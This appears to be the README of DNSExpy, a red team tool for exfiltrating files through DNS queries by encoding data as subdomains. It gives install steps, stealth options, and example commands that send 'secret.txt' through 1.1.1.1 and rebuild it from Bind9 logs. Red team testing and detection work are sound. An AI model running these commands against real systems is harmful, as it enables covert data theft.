## About DNSExpy ‚Ñπ

DNSExpy is a red team tool that could be used to exfiltrate files through DNS protocol by encoding its data and sending them as "random" subdomains of a target domain. If you control the nameserver of the target domain, then you will be able to recover the exfiltrated data even if you are sending the DNS queries to the current nameserver of the victim machine. In fact, you could choose to send exfiltrated data directly to your own nameserver and use a true domain out of your control like github.com. The problem with this approach is that it will be easily detected because of the different nameserver used. 
About recovering exfiltrated data, DNSExpy could do the whole process automatically if the name server of the attacker used is Bind9 and a query log file is provided to the tool. Finally, the exfiltration process could be done in a stealthy way by adjusting time frame and amount of requests per data chunk.

### Features
* Data exfiltration through DNS queries
* Data exfiltration recovering from Bind9 query log files
* Data compression
* Base64 encoding
* Customization of time frame and number of retries
* Custom domains
* Custom dns server
* Error control.

## Installation ‚öôÔ∏è

1. Fork/Clone/Download this repo

    `git clone https://github.com/dgonzalez55/dnsExpy.git`

2. Navigate to the directory

    `cd dnsExpy`

3. Create a virtual environment for this project

    `python -m venv venv`

4. Load the virtual environment
   - On Windows Powershell: `.\venv\Scripts\activate.ps1`

5. Run `pip install -r requirements.txt`

6. Run the dnsExpy.py script

    `python dnsExpy.py <target_options>`

## Example Usage ‚úå

Exfiltrating secret.txt file using fpdeinformatica.es domain to encode data and through DNS queries sent to 1.1.1.1 (cloudflare). 

```
$ python .\DNSExPy.py -f .\secret.txt -d fpdeinformatica.es -D 1.1.1.1 -m send -v 

```

Recovering data from query.log file encoded as random github.com subdomains and saving exfiltrated file as exfiltrated.txt

```
$ python .\DNSExPy.py -f .\query.log -d github.com -m recover ---output exfiltrated.txt -v 

```
